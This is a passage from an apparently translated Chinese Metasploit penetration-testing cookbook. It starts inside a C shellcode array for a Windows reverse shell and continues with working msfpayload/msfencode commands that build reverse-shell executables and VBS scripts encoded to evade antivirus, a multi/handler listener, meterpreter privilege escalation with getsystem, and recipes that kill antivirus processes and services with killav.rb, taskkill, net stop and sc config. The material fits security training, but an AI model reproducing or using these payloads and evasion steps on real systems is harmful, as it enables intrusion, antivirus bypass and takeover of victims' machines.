* VERBOSE=false, LHOST=192.168.56.101, LPORT=4441,
* ReverseConnectRetries=5, EXITFUNC=process,
* InitialAutoRunScript=, AutoRunScript=
*/
unsigned char buf[] =
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01" 
```

注意命令行中的大写`C`参数。您将注意到一个完整的 C 语言 shellcode，我们可以在自己的利用开发代码中使用。或者，我们也有选项可以生成 Ruby 和 Perl 语言的代码。

让我们继续进行下一步，生成一个用于客户端攻击的 shellcode 的二进制可执行文件。

```
root@bt:~# msfpayload windows/shell/reverse_tcp LHOST=192.168.56.101 X > .local/setup.exe
Created by msfpayload (http://www.metasploit.com).
Payload: windows/shell/reverse_tcp
Length: 290
Options: {"LHOST"=>"192.168.56.101"} 
```

注意我们在命令行中传递的各种参数。我们使用`X`参数生成了一个 exe 文件类型，并且该文件已经在名为`.local`的文件夹中生成，文件名为`setup.exe`。现在，这个生成的 exe 可以在我们的客户端攻击中使用。

## 工作原理...

现在我们的可执行文件已经准备好了，我们将不得不在 msfconsole 中设置一个监听器，以便在目标执行此 exe 文件时监听返回连接。

```
msf > use multi/handler
msf exploit(handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf exploit(handler) > set LHOST 192.168.46.101
msf exploit(handler) > exploit
[-] Handler failed to bind to 192.168.46.101:4444
[*] Started reverse handler on 0.0.0.0:4444
[*] Starting the payload handler 
```

注意，我们使用了相同的 payload，并传递了与生成可执行文件时使用的相同的参数值。现在我们的监听器已经准备好接收反向连接。一旦目标用户（运行 Windows 7 之前的 Windows）执行了恶意的 exe 文件，我们就会获得 shell 连接。

# 使用 msfencode 绕过客户端防病毒软件保护

在上一个步骤中，我们专注于如何生成可执行的 shellcode，并将其用作客户端攻击的武器。但是，这样的可执行文件很容易被客户端防病毒软件检测到，可以阻止执行这样的恶意文件，并且还会引发警报。那么现在我们该怎么办呢？我们将不得不通过编码可执行文件来提高攻击向量的级别。

防病毒软件使用基于签名的技术，通过验证文件的前几行代码与其签名数据库来识别潜在威胁。如果找到匹配项，则将文件视为威胁。我们将不得不利用这种技术来绕过防病毒软件。`msfencode`是一种有效的工具，它对 shellcodes 进行编码，使它们对防病毒软件的检测能力降低。`msfencode`为我们提供了许多编码选项。

在开始这个步骤之前，有一件重要的事情要记住。这个步骤的成功取决于两个因素：使用的 shellcode 类型和目标机器上运行的防病毒软件类型。这个步骤涉及大量的实验，以检查使用哪种 shell 和可以用来绕过特定类型防病毒软件的编码类型。在这里，我们有两个目标。一个运行 Windows XP SP2，上面运行着 AVG 10（免费版本），另一个是运行 ESET NOD32（完整和更新版本）的 Windows 7 Ultimate 机器。首先，我们将讨论一种简单的技术，可以绕过旧的和未更新的防病毒软件，但可能会被最新版本的防病毒软件检测到。然后，我们将讨论另一种技术，目前可以绕过任何防病毒软件。

## 准备工作...

`msfencode`通常与`msfpayload`命令一起进行编码生成的 shellcode。这减少了我们的工作步骤。让我们先从`msfencode`开始。执行`msfencode -h`命令列出了我们可以使用的各种参数，`msfencode -l`列出了各种编码样式。让我们逐个看一下：

```
root@bt:~# msfencode -l
Framework Encoders
==================
Name Rank Description
---- ---- -----------
cmd/generic_sh good Generic Shell Variable Substitution Command Encoder
cmd/ifs low Generic ${IFS} Substitution Command Encoder
cmd/printf_php_mq manual printf(1) via PHP magic_quotes Utility Command Encoder
generic/none normal The "none" Encoder
mipsbe/longxor normal XOR Encoder
mipsle/longxor normal XOR Encoder
php/base64 great PHP Base64 encoder
ppc/longxor normal PPC LongXOR Encoder
ppc/longxor_tag normal PPC LongXOR Encoder
sparc/longxor_tag normal SPARC DWORD XOR Encoder
x64/xor normal XOR Encoder
x86/alpha_mixed low Alpha2 Alphanumeric Mixedcase Encoder
x86/alpha_upper low Alpha2 Alphanumeric Uppercase Encoder
x86/avoid_utf8_tolower manual Avoid UTF8/tolower
x86/call4_dword_xor normal Call+4 Dword XOR Encoder
x86/context_cpuid manual CPUID-based Context Keyed Payload Encoder
x86/context_stat manual stat(2)-based Context Keyed Payload Encoder
x86/context_time manual time(2)-based Context Keyed Payload Encoder
x86/countdown normal Single-byte XOR Countdown Encoder
x86/fnstenv_mov normal Variable-length Fnstenv/mov Dword XOR Encoder
x86/fnstenv_mov normal Variable-length Fnstenv/mov Dword XOR Encoder
x86/jmp_call_additive normal Jump/Call XOR Additive Feedback Encoder
x86/nonalpha low Non-Alpha Encoder
x86/nonupper low Non-Upper Encoder
x86/shikata_ga_nai excellent Polymorphic XOR Additive Feedback Encoder
x86/single_static_bit manual Single Static Bit
x86/unicode_mixed manual Alpha2 Alphanumeric Unicode Mixedcase Encoder
x86/unicode_upper manual Alpha2 Alphanumeric Unicode Uppercase Encoder 
```

框架中有许多不同的编码器，每个编码器都使用不同的技术来混淆 shellcode。`shikata_ga_nai`编码技术实现了多态 XOR 加性反馈编码器。解码器存根是基于动态指令替换和动态块排序生成的。寄存器也是动态选择的。

## 如何做...

我将这个步骤分为三种不同的情况，以更好地理解我们如何深入挖掘这个有用的工具并发展我们自己的逻辑。

**情况 1：**我们将从对一个简单的 shell 进行编码开始。`msfpayload`和`msfencode`命令将被一起进行管道处理。

```
root@bt:~# msfpayload windows/shell/reverse_tcp LHOST=192.168.56.101 R | msfencode -e cmd/generic_sh -c 2 -t exe > .local/encoded.exe
[*] cmd/generic_sh succeeded with size 290 (iteration=1)
[*] cmd/generic_sh succeeded with size 290 (iteration=2) 
```

让我们了解命令行。我们使用了`windows/shell/reverse_tcp` shell，并使用`R`参数生成了原始文件类型。然后，我们将`msfencode`命令进行了管道处理。`e`参数用于确定编码样式，在我们的情况下是`cmd/generic_sh`。`c`参数表示迭代次数，`t`参数表示编码后要创建的文件类型。最后，文件将在`.local`文件夹中创建，文件名为`encoded.exe`。当`encoded.exe`文件用于对我们的两个目标进行客户端攻击时，Windows XP（带有 AVG 10）和 Windows 7（带有 NOD32）都很容易识别它为威胁。它可能为我们提供了 shell 连接，但是这种活动被防病毒软件阻止了。

案例 2：现在我们将通过向 shell 添加默认的 Windows 可执行文件模板以及增加编码的迭代次数来增加这种编码的复杂性。默认模板将帮助我们通过将 shellcode 与默认的 Windows 可执行文件（如`calc.exe`或`cmd.exe`）绑定来创建一个不太可疑的文件。Windows 模板可在文件夹`/opt/framework3/msf3/lib/msf/util/../../../data/templates`中找到。

您可以通过将任何默认的 Windows 可执行文件复制到此文件夹中，然后将其用作模板来创建模板。在这个配方中，我已经将`cmd.exe`复制到这个文件夹中，以便将其用作我的 shell 的模板。那么在这种情况下，我们的命令行会是什么样子？

```
root@bt:~# msfpayload windows/shell/reverse_tcp LHOST=192.168.56.101 R | msfencode -e x86/shikata_ga_nai -c 20 -t exe -x cmd.exe> .local/cmdencoded.exe 
```

这种情况下唯一的额外参数是`-x`，用于指定替代可执行模板。我们使用了`cmd.exe`作为模板，这是命令提示符的默认 Windows 可执行文件。此外，我们还将编码样式更改为`shikata_ga_nai`，在`msfencode`中排名为“优秀”。在这种情况下，迭代次数也增加到了 20。在这种情况下创建的可执行文件看起来像一个`cmd.exe`可执行文件（因为模板），并且轻松地绕过了运行 AVG 10 防病毒软件的 Windows XP 目标的客户端防病毒保护。不幸的是，在我们运行最新版本的 NOD32 的 Windows 7 目标上被检测为威胁。因此，它可以用于绕过运行在 Windows 机器上的较旧版本的防病毒软件。这种技术的第二个问题是，即使在具有较旧的防病毒保护的 Windows 7/Server 2008 机器上，它也无法启动 shell。shellcode 在执行时崩溃（因为模板），即使它绕过了防病毒软件，仍然无法在较新版本的 Windows 上启动 shell。

案例 3：这种情况将克服我们在案例 2 中遇到的缺点。在这种情况下，我们将生成一个客户端脚本，而不是可执行文件。Windows 平台上众所周知的客户端脚本是 Visual Basic 脚本（.vbs）。这种技术可以用来绕过任何已知的运行在最新版本的 Windows 上的防病毒软件。VB 脚本成为绕过防病毒软件的潜在武器的原因是，它们从不被防病毒程序视为威胁，这就是为什么它们的签名从不与 VB 脚本文件匹配的原因。让我们使用`msfpayload`和`msfencode`创建一个恶意的 VB 脚本。

```
root@bt:~# msfpayload windows/shell/reverse_tcp LHOST=192.168.56.101 r | msfencode -e x86/shikata_ga_nai -c 20 -t vbs > .local/cmdtest2.vbs
[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)
[*] x86/shikata_ga_nai succeeded with size 344 (iteration=2)
[*] x86/shikata_ga_nai succeeded with size 371 (iteration=3)
.
.
.
.
[*] x86/shikata_ga_nai succeeded with size 803 (iteration=19)
[*] x86/shikata_ga_nai succeeded with size 830 (iteration=20) 
```

注意命令行中的轻微变化。唯一的变化是将 exe 替换为 VBS，并且我们没有使用任何模板，以防止客户端执行期间的崩溃。这种技术可以帮助我们绕过目标的防病毒保护，并提供 shell 连接。我们可以使用 multi/handler 模块（在前面的配方中讨论过）设置监听器，并等待目标执行脚本后与其建立反向连接。

到目前为止，您可能已经注意到，这个配方纯粹是基于尝试不同的有效载荷和编码器的组合。您尝试不同组合的次数越多，成功的机会就越大。在`msfpayload`和`msfencode`中有许多可以探索的东西，因此我鼓励您积极尝试不同的实验，并发现自己绕过防病毒保护的方法。

## 工作原理...

编码器主要用于将 shellcode 脚本混淆成无法被杀毒软件识别的形式。`shikata_ga_nai`编码器使用多态异或技术，编码器使用动态生成的 gats 作为编码器。`shikata_ga_nai`受欢迎的原因是它使用自解码技术。自解密意味着软件在运行时解密自身的一部分。理想情况下，软件只包含一个解密存根和加密代码。迭代通过多次使用相同的操作来使 shellcode 看起来完全陌生，以使杀毒软件难以识别。

## 还有更多...

让我们找到一个快速的方法来测试有效载荷针对不同的反病毒供应商，并找出它们中有多少检测到我们的编码有效载荷。

### 使用 VirusTotal 进行快速多重扫描

VirusTotal 是一个在线网站兼实用工具，可以将您的文件与多个杀毒软件供应商进行扫描，以找出有多少个杀毒软件将其检测为威胁。您可以将编码的有效载荷与病毒总和进行扫描，以找出它是否在任何杀毒产品中引发警报。这可以帮助您快速找出您的编码有效载荷是否在实际中有效。

![使用 VirusTotal 进行快速多重扫描](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_04_04.jpg)

VirusTotal 可以从[`www.virustotal.com`](http://www.virustotal.com)浏览。它会要求您上传要针对多个杀毒产品进行扫描的文件。扫描完成后，它将返回测试结果。

# 使用 killav.rb 脚本来禁用杀毒软件程序

在上一个示例中，我们专注于可以实施的各种技术，以绕过客户端杀毒软件保护并打开一个活动会话。好吧，故事并没有结束。如果我们想要从目标系统下载文件，或者安装键盘记录器等等。这样的活动可能会引起杀毒软件的警报。因此，一旦我们获得了一个活动会话，我们的下一个目标应该是悄悄地关闭杀毒软件保护。这个示例就是关于停用它们的。在目标机器上保持我们的活动不被检测到，杀死杀毒软件是必不可少的。

在这个示例中，我们将在活动会话期间使用一些可用的 meterpreter 脚本。我们有一个专门的章节专门介绍 meterpreter 脚本，所以在这里我只会对 meterpreter 脚本和一些有用的 meterpreter 命令进行快速介绍。我们将在下一章中详细分析 meterpreter。

## 准备工作

让我们从对 meterpreter 的快速介绍开始。Meterpreter 是一个高级有效载荷，极大地增强了对目标机器上命令执行的能力。它是一个命令解释器，通过内存中的 DLL 注入工作，并为我们提供了许多优势，相对于传统的命令解释器（通常存在于 shell 代码）来说，它更加灵活、稳定和可扩展。它可以像几个有效载荷一起在目标机器上工作。它通过分段套接字进行通信，并提供了全面的客户端端 ruby API。我们可以使用`windows/meterpreter`目录中可用的有效载荷来获得 meterpreter shell。在这个示例中，我们将使用`windows/meterpreter/reverse_tcp`有效载荷，我们的目标机器是运行 ESET NOD32 杀毒软件的 Windows 7。

让我们在 msfconsole 中设置监听器，并等待一个反向连接。

```
msf > use multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > show options
Module options (exploit/multi/handler):
Name Current Setting Required Description
---- --------------- -------- -----------
Payload options (windows/meterpreter/reverse_tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
EXITFUNC process yes Exit technique: seh..
LHOST 192.168.56.101 yes The listen address
LPORT 4444 yes The listen port
Exploit target:
Id Name
-- ----
0 Wildcard Target
msf exploit(handler) > exploit
[*] Started reverse handler on 192.168.56.101:4444
[*] Starting the payload handler... 
```

## 如何做到...

1.  所以我们的监听器现在已经准备好了。一旦客户端攻击成功地在目标上执行，我们将在 msfconsole 中打开一个 meterpreter 会话。

```
[*] Sending stage (752128 bytes) to 192.168.56.1
[*] Meterpreter session 2 opened (192.168.56.101:4444 -> 192.168.56.1:49188) at 2011-11-29 13:26:55 +0530
meterpreter > 
```

1.  现在，我们已经准备好利用 meterpreter 在我们的杀毒实验中的力量。我们将执行的第一个命令是`getuid`，它会给我们系统的用户名，我们已经破解了。用户可以是主管理员或者是一个权限较低的用户。

```
meterpreter > getuid
Server username: DARKLORD-PC\DARKLORD 
```

1.  看起来我们在刚刚渗透的系统中没有管理员特权。下一步将是提升我们的特权到管理员，以便我们可以在目标上执行命令而不受干扰。我们将使用`getsystem`命令，尝试将我们的特权从本地用户提升到管理员。

```
meterpreter > getsystem
...got system (via technique 4).. 
```

1.  我们可以看到`getsystem`成功地使用`技术 4`，也就是 KiTrap0D 漏洞，提升了我们在渗透系统上的特权。我们可以再次使用`getuid`命令来检查我们新提升的 ID。

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM 
```

1.  现在我们拥有了主管理员权限。下一步将是运行`ps`命令，列出系统上所有正在运行的进程。我们将需要查看控制目标机器上运行的杀毒软件的那些进程（输出已经被缩短以适应）。

```
PID Name User Path
--- ---- ---- ----
1060 svchost.exe NT AUTHORITY\SYSTEM C:\Windows\System32\.
1096 svchost.exe NT AUTHORITY\SYSTEM C:\Windows\system32\.
1140 stacsv.exe NT AUTHORITY\SYSTEM C:\Windows\System32\.
1152 dsmonitor.exe DARKLORD-PC\DARKLORD C:\Program Files\Uni.
1744 egui.exe DARKLORD-PC\DARKLORD C:\Program Files\ESET\ESET NOD32 Antivirus\egui.exe
1832 eset.exe NT AUTHORITY\SYSTEM C:\Program Files\ESET\ESET NOD32 Antivirus\eset.exe 
```

1.  从`Name`和`Path`列中，我们可以很容易地识别出属于杀毒软件实例的进程。在我们的情况下，有两个进程负责目标系统上的杀毒保护。它们是`egui.exe`和`eset.exe`。让我们看看如何使用 Metasploit 来终止这些进程。

## 工作原理

Meterpreter 提供了一个非常有用的脚本，名为`killav.rb`，可以用来终止目标系统上运行的杀毒软件进程，从而禁用它。让我们在运行 ESET NOD32 杀毒软件的 Windows 7 目标上尝试这个脚本。

```
meterpreter > run killav
[*] Killing Antivirus services on the target... 
```

`run`命令用于在 meterpreter 中执行 Ruby 脚本。一旦脚本执行完毕，我们可以再次检查目标上正在运行的进程，以确保所有杀毒软件进程都已被终止。如果没有杀毒软件进程在运行，那么意味着杀毒软件已经在目标机器上被暂时禁用，我们现在可以继续进行渗透测试过程。

但是如果进程仍在运行怎么办？让我们在下一个步骤中找到解决方案。

# 深入了解 killav.rb 脚本

继续我们之前的步骤，我们专注于如何使用`killav.rb`脚本在目标机器上终止运行的杀毒软件进程。但是，如果进程仍在运行，或者即使使用脚本后它们仍未被终止，会怎么样呢？这可能有两个原因。要么`killav.rb`没有在其终止列表中包括这些进程，要么杀毒软件进程正在作为服务运行。在这个步骤中，我们将尝试克服这些问题。所以让我们快速进入我们的步骤。

## 准备工作

我们将从上一个步骤结束的地方开始相同的 meterpreter 会话。我们已经使用了`killav.rb`脚本一次，但是杀毒软件进程仍在运行。我们可以使用`ps`命令查看正在运行的进程。

```
PID Name User Path
--- ---- ---- ----
1060 svchost.exe NT AUTHORITY\SYSTEM C:\Windows\System32\.
1096 svchost.exe NT AUTHORITY\SYSTEM C:\Windows\system32\.
1140 stacsv.exe NT AUTHORITY\SYSTEM C:\Windows\System32\.
1152 dsmonitor.exe DARKLORD-PC\DARKLORD C:\Program Files\Uni.
1744 egui.exe DARKLORD-PC\DARKLORD C:\Program Files\ESET\ESET NOD32 Antivirus\egui.exe
1832 eset.ece NT AUTHORITY\SYSTEM C:\Program Files\ESET\ESET NOD32 Antivirus\eset.exe 
```

正如我们所看到的，即使使用了`killav.rb`脚本，这两个杀毒软件进程仍然存活。让我们先看一下`killav.rb`脚本。

## 如何操作

1.  要查看和编辑`killav.rb`脚本，请打开一个新的终端窗口，浏览到`/pentest/exploits/framework3/scripts/meterpreter`。

```
root@bt: cd /pentest/exploits/framework3/scripts/meterpreter
root@bt:/pentest/exploits/framework3/scripts/meterpreter# vim killav.rb 
```

1.  `vim`是 Unix 中用于快速编辑文件的编辑器。它将在我们的屏幕上打开整个脚本。向下滚动以查找其中列出的各种进程。这些是脚本寻找要终止的进程。检查整个列表，查找`eset.exe`和`egui.exe`。如果它们不可用，那么将这两个进程添加到脚本中。要在 vim 中启动编辑模式，请按*a*键。它将启动插入模式。现在在脚本的进程列表中添加这两个进程。

```
@@exec_opts.parse(args) { |opt, idx, val|
case opt
when "-h"
usage
end
}
print_status("Killing Antivirus services on the target...")
avs = %W{
egui.exe
eset.exe
AAWTray.exe
Ad-Aware.exe
MSASCui.exe
_avp32.exe 
```

1.  以下代码片段显示了列表顶部添加的两个进程。要退出插入模式，请按*esc*键。现在要保存脚本，请按*:*键。您将进入 vim 编辑器的迷你命令提示符。现在输入`wq`以保存并退出编辑器。

```
:wq

```

1.  现在回到 meterpreter 会话，再次执行`killav.rb`脚本，注意发生了什么。

```
meterpreter > run killav.rb
[*] Killing Antivirus services on the target...
[*] Killing off egui.exe...
[*] Killing off eset.exe... 
```

1.  命令执行的输出显示脚本成功杀死了两个进程。现在，为了验证所有杀毒软件进程是否已被杀死，我们将再次执行`ps`命令进行交叉检查（输出缩短以适应）。

```
meterpretr> ps
PID Name User Path
--- ---- ---- ----
1060 svchost.exe NT AUTHORITY\SYSTEM C:\Windows\System32\.
1096 svchost.exe NT AUTHORITY\SYSTEM C:\Windows\system32\.
1140 stacsv.exe NT AUTHORITY\SYSTEM C:\Windows\System32\.
1152 dsmonitor.exe DARKLORD-PC\DARKLORD C:\Program Files\Uni. 
```

您会发现 ESET 杀毒软件没有活动进程。这表明脚本成功杀死了杀毒软件程序。这个例子清楚地展示了我们如何通过添加自己的输入来增加内置脚本的效率。

## 它是如何工作的...

让我们快速看一下我们在本篇文章中积极使用的`killav.rb`脚本。脚本包含一个数组（%W）中的整个进程列表，它在目标机器上查找并杀死。

```
client.sys.process.get_processes().each do |x|
if (avs.index(x['name'].downcase))
print_status("Killing off #{x['name']}...")
client.sys.process.kill(x['pid'])
end
end 
```

代码的最后几行是不言自明的。脚本在目标系统上查找正在运行的进程与其数组进行匹配。当找到匹配时，它使用`process.kill`函数来终止进程。这个循环会一直持续，直到数组的所有元素与可用进程匹配。

# 从命令行杀死杀毒软件服务

在上一篇文章中，我们给出了杀毒软件进程在使用`killav.rb`脚本后仍然运行的两个原因。在上一篇文章中，我们解决了第一个问题，即`killav.rb`列表不包括要被杀死的进程。在本篇文章中，我们将解决第二个问题，即杀毒软件程序在目标机器上作为服务运行。在我们继续之前，让我们先了解一下进程和服务之间的区别。

进程是计算机上正在运行的任何软件。一些进程在计算机启动时启动，其他的在需要时手动启动。一些进程是服务，它们发布方法以便其他程序可以根据需要调用它们。进程是基于用户的，而服务是基于系统的。

杀毒软件也可以作为服务运行一些组件，比如电子邮件过滤器、网络访问过滤器等。`killav.rb`脚本无法杀死服务。所以，即使我们使用`killav.rb`杀死了进程，杀毒软件服务也会立即重新启动它们。所以即使`killav.rb`杀死了所有杀毒软件进程，但每次使用`ps`命令时它们仍然被列出，那么可以得出结论，杀毒软件的某个组件作为服务在负责重复启动进程。

## 准备好了

我们将从一个场景开始，目标机器是运行 AVG 10 杀毒软件的 Windows 7 机器。我假设我们已经与目标机器建立了一个具有管理员权限的活动 meterpreter 会话。

## 如何做...

1.  这个配方将使用 Windows 命令提示符。所以我们将从打开一个带有目标的命令提示符 shell 开始。

```
meterpreter > shell
Process 3324 created.
Channel 1 created.
C:\WINDOWS\system32> 
```

1.  现在，我们将使用`tasklist`命令来查找各种可用任务。添加`/SVC`参数将只列出作为服务运行的进程。由于我们知道目标机器正在使用 AVG 杀毒软件，我们可以添加通配符搜索，只列出属于 avg 的服务。因此，我们的命令行将如下所示：

```
C:\WINDOWS\system32>tasklist /SVC | find /I "avg"
tasklist /SVC | find /I "avg"
avgchsvx.exe 260 N/A
avgrsx.exe 264 N/A
avgcsrvx.exe 616 N/A
AVGIDSAgent.exe 1664 AVGIDSAgent
avgwdsvc.exe 116 avg9wd
avgemc.exe 1728 avg9emc 
```

所以我们有一个完整的列表或服务和进程为 AVG 杀毒软件。下一步将是发出`taskkill`命令来终止这些任务并禁用杀毒软件保护。

1.  我们可以再次使用通配符搜索来杀死所有进程名称为`avg`的任务。

```
C:\WINDOWS\system32>taskkill /F /IM "avg*" 
```

`/F`参数用于强制终止进程。这将最终杀死目标机器上运行的各种杀毒软件服务。这个配方有很多地方可以探索。您可能会遇到一些问题，但可以通过遵循正确的一系列命令来克服。

## 它是如何工作的...

从命令行杀死服务只是调用操作系统来禁用特定服务。一旦我们与目标建立了一个活动的 shell 会话，我们可以代表命令行通过我们的 shell 调用这些命令。

## 还有更多...

让我们用一些最终说明来结束这个配方，讨论一下如果杀毒软件服务仍然存在该怎么办。

### 有些服务没有被终止，接下来怎么办？

这可能是由于几个原因。当你使用`taskkill`命令时，可能会出现一些服务的错误。为了克服这个问题，我们可以使用`net stop`和`sc config`命令来处理这些服务。我建议你从微软的网站上了解这两个命令的用法。它们可以帮助我们终止或禁用那些无法通过`taskkill`命令停止的服务。
